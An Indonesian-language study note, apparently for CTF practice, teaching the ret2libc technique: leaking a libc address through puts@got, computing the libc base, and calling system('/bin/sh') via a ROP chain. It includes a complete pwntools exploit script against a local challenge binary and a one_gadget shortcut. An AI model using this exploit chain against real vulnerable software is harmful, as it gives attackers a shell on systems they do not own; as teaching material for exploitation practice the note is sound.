#cybersecurity

Ret2libc adalah teknik ROP paling umum: memanggil fungsi dari **libc** (biasanya `system`) dengan argumen yang kita kontrol. Karena libc berisi `system`, `execve`, dan string `/bin/sh`, kita tidak perlu menulis kode apa pun.

## Kenapa libc?

Program dynamic selalu memuat libc (lihat `ldd chall`). libc punya:

- `system()` - jalankan command
- `execve()` - jalankan program
- String `"/bin/sh"` - tinggal cari

## Tantangan: ASLR

Alamat libc **acak tiap run** (ASLR). Tapi **offset dalam libc tetap**. Jadi:

```
alamat system  = libc_base + offset_system
alamat /bin/sh = libc_base + offset_binsh
```

Kalau kita tahu satu alamat di libc (leak), kita bisa hitung semuanya.

## Langkah exploit

### 1. Leak alamat libc

Panggil `puts(puts@got)` - puts akan mencetak **isi** GOT, yaitu alamat puts di libc:

```python
payload = b"A"*offset
payload += p64(elf.plt.puts)      # panggil puts
payload += p64(elf.sym.main)      # return ke main (jalankan ulang)
payload += p64(elf.got.puts)      # argumen: alamat GOT puts

io.sendlineafter(b": ", payload)
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
print(f"[+] puts @ {hex(leak)}")
```

### 2. Hitung libc base

```python
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# GANTI dengan libc yang dipakai challenge kalau disertakan!

libc.address = leak - libc.sym.puts
print(f"[+] libc base @ {hex(libc.address)}")

system = libc.sym.system
binsh  = next(libc.search(b"/bin/sh"))
```

### 3. Payload kedua: system("/bin/sh")

```python
pop_rdi = 0x4013b3   # gadget pop rdi; ret

payload = b"A"*offset
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

io.sendlineafter(b": ", payload)
io.interactive()   # shell!
```

## Exploit lengkap

```python
from pwn import *

context.binary = elf = ELF("./chall")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = process("./chall")

offset = 72
pop_rdi = 0x4013b3

# --- Stage 1: leak ---
payload = b"A"*offset + p64(elf.plt.puts) + p64(elf.sym.main) + p64(elf.got.puts)
io.sendlineafter(b": ", payload)
io.recvline()  # baris "Halo ..."
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
print(f"puts @ {hex(leak)}")

# --- Hitung ---
libc.address = leak - libc.sym.puts
system = libc.sym.system
binsh = next(libc.search(b"/bin/sh"))
print(f"system @ {hex(system)}")

# --- Stage 2: system("/bin/sh") ---
payload = b"A"*offset + p64(pop_rdi) + p64(binsh) + p64(system)
io.sendlineafter(b": ", payload)
io.interactive()
```

## One gadget (alternatif cepat)

```bash
one_gadget /lib/x86_64-linux-gnu/libc.so.6
# 0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
```

```python
libc.address = leak - libc.sym.puts
payload = b"A"*offset + p64(libc.address + 0x4f2a5)
```

Syarat register tertentu harus terpenuhi - coba satu per satu.

## Catatan

1. **Libc harus cocok** dengan remote! Kalau challenge memberi `libc.so.6`, pakai itu. Kalau tidak, tebak distribusi (Ubuntu 22.04 = libc 2.35, dsb) atau pakai libc database.
2. Kalau crash setelah system di 64-bit, tambahkan `ret` gadget sebelum chain (alignment - lihat [[Calling Convention]]).
3. Kalau fungsi `puts` tidak ada di PLT, leak pakai `printf`, `write`, atau `write@plt` dengan 3 argumen.
4. `elf.sym.main` dipakai untuk "kembali" menjalankan program - bisa diganti alamat fungsi lain yang menerima input lagi.
5. Leak yang hanya 6 byte → `ljust(8, b"\x00")` (lihat [[Little Endian dan Format Data]]).
